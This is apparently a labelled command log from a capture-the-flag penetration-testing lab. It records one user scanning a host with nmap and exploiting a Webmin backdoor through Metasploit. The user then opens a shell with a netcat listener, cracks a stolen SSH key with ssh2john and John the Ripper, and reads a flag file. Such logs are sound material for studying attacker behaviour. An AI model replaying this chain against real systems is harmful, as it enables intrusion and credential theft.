User 44 start time 1594797942 end 1594801102
PADDING
PADDING
PADDING
INPUT|44--0|A0 A1 |1594797942|44|nmap --help|OUTPUT
INPUT|44--1|M0 |1594798019|44|nmap -v 172.18.1.5|OUTPUT
INPUT|44--2|M2 |1594798124|44|msfconsole|OUTPUT
INPUT|44--3|M3 |1594798228|44|search webmin|OUTPUT
INPUT|44--4|M8 |1594798347|44|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|44--5|M5 |1594798362|44|show options|OUTPUT
INPUT|44--6|A6 |1594798389|44|set rhosts 172.18.1.5|OUTPUT
INPUT|44--7|U|1594798399|44|run|OUTPUT
INPUT|44--8|A6 |1594798422|44|set lhost 10.1.135.83|OUTPUT
INPUT|44--9|U|1594798691|44|run|OUTPUT
INPUT|44--10|A16 |1594798814|44|cd /root/.ssh|OUTPUT
INPUT|44--11|A16 |1594798851|44|cd .ssh|OUTPUT
INPUT|44--12|A10 |1594798852|44|ls|OUTPUT
INPUT|44--13|A10 |1594798854|44|ls -la|OUTPUT
INPUT|44--14|A16 |1594798890|44|ssh-keygen -t rsa|OUTPUT
INPUT|44--15|U|1594798919|44|show options|OUTPUT
INPUT|44--16|U|1594798985|44|run|OUTPUT
INPUT|44--17|A13 |1594799892|44|python -c 'import subprocess; p=subprocess.call([/bin/sh|OUTPUT
INPUT|44--18|U|1594799907|44|nc -nvlp 225|OUTPUT
INPUT|44--19|U|1594800706|44|cd .|OUTPUT
INPUT|44--20|U|1594800708|44|cd ..|OUTPUT
INPUT|44--21|A10 |1594800709|44|ls -la|OUTPUT
INPUT|44--22|A10 |1594800711|44|ls|OUTPUT
INPUT|44--23|A10 |1594800713|44|ls -la|OUTPUT
INPUT|44--24|A10 |1594800716|44|ls -a|OUTPUT
INPUT|44--25|A10 |1594800718|44|ls -l|OUTPUT
INPUT|44--26|M16 |1594800733|44|ssh eve@10.1.17.4 --help|OUTPUT
INPUT|44--27|U|1594800759|44|ssh -i eve.key eve@10.1.17.4|OUTPUT
INPUT|44--28|U|1594800776|44|chown key.eve 0644|OUTPUT
INPUT|44--29|A15 |1594800785|44|chmod key.eve 0644|OUTPUT
INPUT|44--30|A15 |1594800796|44|chmod 0644 key.eve|OUTPUT
INPUT|44--31|A10 |1594800800|44|ls|OUTPUT
INPUT|44--32|A15 |1594800806|44|chmod 0644 eve.key|OUTPUT
INPUT|44--33|U|1594800810|44|ssh -i eve.key eve@10.1.17.4|OUTPUT
INPUT|44--34|U|1594800823|44|sudo ssh -i eve.key eve@10.1.17.4|OUTPUT
INPUT|44--35|A15 |1594800849|44|chmod 0700 eve.key|OUTPUT
INPUT|44--36|U|1594800851|44|ssh -i eve.key eve@10.1.17.4|OUTPUT
INPUT|44--37|A14 |1594800879|44|ssh2john eve.key > eve.hash|OUTPUT
INPUT|44--38|A1 A9 A10 A11 A12 A14 A17 |1594800894|44|locate ssh2john.py|OUTPUT
INPUT|44--39|M13 |1594800908|44|python ssh2john.py eve.key > eve.hash|OUTPUT
INPUT|44--40|A10 |1594800911|44|ls|OUTPUT
INPUT|44--41|A1 A9 A11 A12 A17 |1594800915|44|cat eve.hash|OUTPUT
INPUT|44--42|A14 |1594800925|44|john eve.hash -wordlist=rockyou.txt|OUTPUT
INPUT|44--43|A1 A9 A10 A11 A12 A17 |1594800939|44|locate rockyou.txt|OUTPUT
INPUT|44--44|A14 |1594800949|44|john eve.hash -wordlist=/usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|44--45|U|1594800983|44|ssh -i eve.key eve@10.1.17.4|OUTPUT
INPUT|44--46|A10 |1594801088|44|ls|OUTPUT
INPUT|44--47|A10 |1594801091|44|ls -la|OUTPUT
INPUT|44--48|U|1594801097|44|cd top-secret/|OUTPUT
INPUT|44--49|A10 |1594801098|44|ls -la|OUTPUT
INPUT|44--50|M17 |1594801102|44|cat flag.txt|OUTPUT
